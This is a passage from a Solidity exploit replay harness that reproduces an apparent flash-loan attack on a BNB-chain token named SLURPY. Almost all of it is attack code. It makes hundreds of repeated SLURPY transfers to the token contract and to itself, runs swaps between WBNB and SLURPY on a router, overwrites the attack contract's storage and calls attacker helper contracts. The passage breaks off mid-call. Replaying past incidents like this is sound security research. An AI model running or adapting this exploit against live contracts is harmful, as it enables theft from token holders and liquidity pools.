                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_234);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_235 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_235);
            }
            {
                uint256 transferLiveAmount_236 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_236);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_237 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_237);
            }
            {
                uint256 transferLiveAmount_238 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_238);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_239 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_239);
            }
            {
                uint256 transferLiveAmount_240 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_240);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_241 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_241);
            }
            {
                uint256 transferLiveAmount_242 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_242);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_243 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_243);
            }
            {
                uint256 transferLiveAmount_244 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_244);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_245 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_245);
            }
            {
                uint256 transferLiveAmount_246 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_246);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_247 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_247);
            }
            {
                uint256 transferLiveAmount_248 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_248);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_249 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_249);
            }
            {
                uint256 transferLiveAmount_250 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_250);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_251 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_251);
            }
            {
                uint256 transferLiveAmount_252 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_252);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
        }
        IContract_10ED43_024E(Addresses.A_10ED43_024E)
            .swapTokensForExactTokens(
                1234618153575665092961492,
                903817868375115120,
                _addressArray2(Addresses.WBNB, Addresses.SLURPY),
                address(this),
                1734552916
            );
    }

    function flashCallback4() internal {
        {
            Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(0)), bytes32(uint256(0)));
            {
                uint256 transferLiveAmount_253 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_253);
            }
            {
                uint256 transferLiveAmount_254 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_254);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_255 = 75260315473130930575505;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_255);
            }
            {
                uint256 transferLiveAmount_256 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_256);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_257 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_257);
            }
            {
                uint256 transferLiveAmount_258 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_258);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_259 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_259);
            }
            {
                uint256 transferLiveAmount_260 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_260);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_261 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_261);
            }
            {
                uint256 transferLiveAmount_262 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_262);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_263 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_263);
            }
            {
                uint256 transferLiveAmount_264 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_264);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_265 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_265);
            }
            {
                uint256 transferLiveAmount_266 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_266);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_267 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_267);
            }
            {
                uint256 transferLiveAmount_268 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_268);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_269 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_269);
            }
            {
                uint256 transferLiveAmount_270 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_270);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_271 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_271);
            }
            {
                uint256 transferLiveAmount_272 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_272);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_273 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_273);
            }
            {
                uint256 transferLiveAmount_274 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_274);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_275 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_275);
            }
            {
                uint256 transferLiveAmount_276 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_276);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
        }
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(0)), bytes32(uint256(0)));
        IContract_10ED43_024E(Addresses.A_10ED43_024E)
            .swapTokensForExactTokens(
                1234618153575665073587742,
                906444472988435039,
                _addressArray2(Addresses.WBNB, Addresses.SLURPY),
                address(this),
                1734552916
            );
        {
            Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(0)), bytes32(uint256(0)));
            {
                uint256 transferLiveAmount_277 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_277);
            }
            {
                uint256 transferLiveAmount_278 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_278);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_279 = 75260315473130930964468;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_279);
            }
            {
                uint256 transferLiveAmount_280 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_280);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_281 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_281);
            }
            {
                uint256 transferLiveAmount_282 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_282);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_283 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_283);
            }
            {
                uint256 transferLiveAmount_284 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_284);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_285 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_285);
            }
            {
                uint256 transferLiveAmount_286 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_286);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_287 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_287);
            }
            {
                uint256 transferLiveAmount_288 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_288);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_289 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_289);
            }
            {
                uint256 transferLiveAmount_290 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_290);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_291 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_291);
            }
            {
                uint256 transferLiveAmount_292 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_292);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_293 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_293);
            }
            {
                uint256 transferLiveAmount_294 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_294);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_295 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_295);
            }
            {
                uint256 transferLiveAmount_296 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_296);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_297 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_297);
            }
            {
                uint256 transferLiveAmount_298 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_298);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_299 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_299);
            }
            {
                uint256 transferLiveAmount_300 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_300);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
        }
        IContract_10ED43_024E(Addresses.A_10ED43_024E)
            .swapTokensForExactTokens(
                1234618153575665073043471,
                909080060130571540,
                _addressArray2(Addresses.WBNB, Addresses.SLURPY),
                address(this),
                1734552916
            );
        {
            Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(0)), bytes32(uint256(0)));
            {
                uint256 transferLiveAmount_301 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_301);
            }
            {
                uint256 transferLiveAmount_302 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_302);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_303 = 75260315473130930975394;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_303);
            }
            {
                uint256 transferLiveAmount_304 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_304);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_305 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_305);
            }
            {
                uint256 transferLiveAmount_306 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_306);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_307 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_307);
            }
            {
                uint256 transferLiveAmount_308 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_308);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_309 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_309);
            }
            {
                uint256 transferLiveAmount_310 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_310);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_311 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_311);
            }
            {
                uint256 transferLiveAmount_312 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_312);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_313 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_313);
            }
            {
                uint256 transferLiveAmount_314 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_314);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_315 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_315);
            }
            {
                uint256 transferLiveAmount_316 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_316);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_317 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_317);
            }
            {
                uint256 transferLiveAmount_318 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_318);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_319 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_319);
            }
            {
                uint256 transferLiveAmount_320 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_320);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_321 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_321);
            }
            {
                uint256 transferLiveAmount_322 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_322);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_323 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_323);
            }
            {
                uint256 transferLiveAmount_324 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_324);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
        }
        IContract_10ED43_024E(Addresses.A_10ED43_024E)
            .swapTokensForExactTokens(
                1234618153575665073028180,
                911724667185555272,
                _addressArray2(Addresses.WBNB, Addresses.SLURPY),
                address(this),
                1734552916
            );
        {
            Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(0)), bytes32(uint256(0)));
            {
                uint256 transferLiveAmount_325 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_325);
            }
            {
                uint256 transferLiveAmount_326 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_326);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_327 = 75260315473130930975701;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_327);
            }
            {
                uint256 transferLiveAmount_328 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_328);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_329 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_329);
            }
            {
                uint256 transferLiveAmount_330 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_330);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_331 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_331);
            }
            {
                uint256 transferLiveAmount_332 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_332);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_333 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_333);
            }
            {
                uint256 transferLiveAmount_334 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_334);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_335 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_335);
            }
            {
                uint256 transferLiveAmount_336 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_336);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_337 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_337);
            }
            {
                uint256 transferLiveAmount_338 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_338);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_339 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_339);
            }
            {
                uint256 transferLiveAmount_340 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_340);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_341 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_341);
            }
            {
                uint256 transferLiveAmount_342 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_342);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_343 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_343);
            }
            {
                uint256 transferLiveAmount_344 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_344);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_345 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_345);
            }
            {
                uint256 transferLiveAmount_346 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_346);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_347 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_347);
            }
            {
                uint256 transferLiveAmount_348 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_348);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
        }
        IContract_10ED43_024E(Addresses.A_10ED43_024E)
            .swapTokensForExactTokens(
                1234618153575665073027750,
                914378331726920769,
                _addressArray2(Addresses.WBNB, Addresses.SLURPY),
                address(this),
                1734552916
            );
        {
            Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(0)), bytes32(uint256(0)));
            {
                uint256 transferLiveAmount_349 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_349);
            }
            {
                uint256 transferLiveAmount_350 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_350);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_351 = 75260315473130930975709;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_351);
            }
            {
                uint256 transferLiveAmount_352 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_352);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_353 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_353);
            }
            {
                uint256 transferLiveAmount_354 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_354);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_355 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_355);
            }
            {
                uint256 transferLiveAmount_356 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_356);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_357 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_357);
            }
            {
                uint256 transferLiveAmount_358 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_358);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_359 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_359);
            }
            {
                uint256 transferLiveAmount_360 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_360);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
        }
        {
            uint256 transferLiveAmount_361 = 100000000000000000000000;
            IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_361);
        }
        {
            uint256 transferLiveAmount_362 = 1;
            IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_362);
        }
        {
            address created = Addresses.attack_helper_05D0;
            require(created.code.length != 0, "replay helper runtime missing");
        }
        AttackerHelper(payable(Addresses.attack_helper_05D0))._helper5();
        IContract_10ED43_024E(Addresses.A_10ED43_024E)
            .swapTokensForExactTokens(
                1300000000000000000000000,
                1033149265405706379,
                _addressArray2(Addresses.WBNB, Addresses.SLURPY),
                Addresses.attack_helper_05D0,
                1734552916
            );
    }

    function flashCallback5() internal {
        {
            address created = Addresses.attack_helper_73DD;
            require(created.code.length != 0, "replay helper runtime missing");
        }
        AttackerHelper(payable(Addresses.attack_helper_73DD))._helper7();
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(0)), bytes32(uint256(0)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(1)));
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
